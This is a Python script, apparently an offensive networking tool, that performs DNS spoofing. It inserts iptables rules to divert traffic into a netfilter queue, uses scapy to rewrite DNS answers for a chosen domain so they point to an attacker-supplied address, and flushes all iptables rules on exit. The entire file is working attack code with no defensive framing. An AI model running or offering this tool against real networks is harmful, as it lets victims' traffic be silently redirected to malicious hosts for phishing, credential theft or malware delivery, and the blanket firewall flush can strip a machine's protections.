import netfilterqueue
import subprocess
import os
import scapy.all as scapy
import argparse


def get_arguments():
	parser =  argparse.ArgumentParser()
	parser.add_argument('-s', '--spoof', help= 'The domain to spoof for')
	parser.add_argument('-r', '--redirection', help= 'The redirect location')
	args = parser.parse_args()
	# print(args)
	return args.spoof, args.redirection

os.system('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0')
os.system('sudo iptables -I INPUT -j NFQUEUE --queue-num 0')

def process_pkt(packet):
	target_url= domain
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.DNSRR):
		qname = scapy_packet[scapy.DNSQR].qname
		if target_url in str(qname):
			print('[+] Spoofing for '+ target_url + ' as '+ redirection)
			answer = scapy.DNSRR(rrname= qname, rdata= redirection)
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1

			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum

			packet.set_payload(bytes(scapy_packet))
	packet.accept()		

queue = netfilterqueue.NetfilterQueue()
domain, redirection = get_arguments()

try:
	# subprocess.call(['sudo', 'iptables', '-I', 'FORWARD','-j','NFQUEUE','--queue-num' ,'0'])
	print('[*]sudo iptables -I FORWARD -j NFQUEUE --queue-num 0')
	queue.bind(0, process_pkt)
	queue.run()
except KeyboardInterrupt:
	print('\n[*]Flushing the iptables')
	subprocess.call(['sudo','iptables','--flush'])
